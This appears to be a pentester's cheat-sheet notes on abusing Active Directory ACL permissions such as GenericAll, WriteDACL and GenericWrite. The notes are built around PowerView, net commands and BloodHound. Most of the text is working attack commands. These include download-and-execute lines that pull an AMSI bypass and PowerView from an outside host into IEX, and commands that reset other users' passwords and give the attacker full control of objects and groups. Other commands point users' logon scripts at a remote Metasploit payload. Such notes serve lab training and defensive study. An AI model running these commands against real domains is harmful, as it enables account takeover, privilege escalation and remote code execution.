### Theory
    - See diagram:  https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse#activedirectory
    - DACLs & ACEs - first match principle; ACE structure as SDDL - ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
        - apply to users, computers, groups, etc.
    - Abusable Permissions:
        - GenericAll - full rights to the object (add users to a group or reset user's password); abused with Set-DomainUserPassword or Add-DomainGroupMember
        - GenericWrite - update object's attributes (i.e logon script); abused with Set-DomainObject
        - WriteOwner - change object owner to attacker controlled user take over the object; abused with Set-DomainObjectOwner
        - WriteDACL - modify object's ACEs and give attacker full control right over the object; abused with Add-DomainObjectACL
        - AllExtendedRights - ability to add user to a group or reset password; abused with - Set-DomainUserPassword or Add-DomainGroupMember
        - ForceChangePassword - ability to change user's password; abused with Set-DomainUserPassword
        - Self (Self-Membership) - ability to add yourself to a group
        - AddMembers - abused with Add-DomainGroupMember
        - **Many More**

### Enumeration with PowerView
    - Any domain user can query DACL for any object
    - . .\powerview.ps1
    - (new-object system.net.webclient).downloadstring('http://192.168.49.121/amsi.txt') | IEX
    - (new-object system.net.webclient).downloadstring('http://192.168.49.121/PowerView.ps1') | IEX
    - Get-ObjectAcl -Identity <user/computer/thing>; ConvertFrom-SID "S........."
        - Better:  Get-ObjectAcl -Identity <user/computer/thing> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
    - **Domain Users we have rights over:**  Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
    - **Domain Groups we have rights over:**  Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

### Other Tools
    - Checking individual objects - aced.py:
        - python3 aced.py prod.abc.com/user:pass@192.168.1.70
        - "Domain Admins", etc.
    - **BloodHound - Use it!**

### Abusing GenericAll
    - User - change password:  net user testservice1 h4x /domain
        - Also possible if you have ForceChangePassword or AllExtendedRights right
    - Group - add yourself:  net group testgroup <user> /add /domain
        - Also possible with AllExtendedRights or GenericWrite

### Abusing WriteDACL
    - User:
        - Step 1 - give yourself rights:  Add-DomainObjectAcl -TargetIdentity testservice2 PrincipalIdentity offsec -Rights All
            - Confirm:  Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
        - Step 2 - use rights (change pw):  net user testservice2 h4x /domain
    - Group:
        - Step 1 - give yourself rights:  Add-DomainObjectAcl -TargetIdentity "MAILADMINS" -PrincipalIdentity SqlSvc -Domain tricky.com -Rights All -Verbose
        - Step 2 - use rights (add yourself):  Add-DomainGroupMember -Identity MAILADMINS -Domain TRICKY.com -Members SqlSvc

### Abusing GenericWrite
    - User: overwrite logon script
        - Set-ADObject -SamAccountName TestService3 -PropertyName scriptpath -PropertyValue "\\192.168.45.210\share\run.txt"
        - Set-DomainObject TestService3 -Set @{'msTSTnitialProgram'='\\192.168.45.210\share\msf.exe'} -Verbose
        - Set-DomainObject TestService3 -Set @{'scriptPath'='\\192.168.45.210\share\msf.exe'} -Verbose
    - Group: add user (yourself)
    - Computer: Resource-Based Constrained Delegation Attack...